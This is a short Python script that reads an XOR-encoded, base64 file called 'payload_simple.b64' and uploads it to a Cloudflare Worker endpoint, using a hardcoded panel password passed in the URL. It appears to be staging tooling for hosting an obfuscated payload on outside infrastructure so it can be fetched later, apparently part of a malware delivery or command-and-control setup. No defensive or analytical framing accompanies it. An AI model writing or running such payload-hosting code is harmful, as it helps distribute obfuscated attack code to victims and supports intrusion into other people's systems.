#!/usr/bin/env python3
import requests

def upload_payload():
    """Upload the simple XOR encoded payload to Cloudflare Worker"""
    
    # Read the encoded payload
    try:
        with open('payload_simple.b64', 'r') as f:
            payload_data = f.read().strip()
        
        print(f"Payload size: {len(payload_data)} characters")
        
        # Upload to Cloudflare Worker
        worker_url = "https://notoggogolnie.xx570186.workers.dev/upload"
        password = "twoje_haslo_do_panelu"  # Same as in worker
        
        response = requests.post(
            f"{worker_url}?auth={password}",
            data=payload_data,
            headers={'Content-Type': 'text/plain'}
        )
        
        if response.status_code == 200:
            print("✅ Payload uploaded successfully!")
            print(f"Response: {response.text}")
        else:
            print(f"❌ Upload failed: {response.status_code}")
            print(f"Response: {response.text}")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    upload_payload()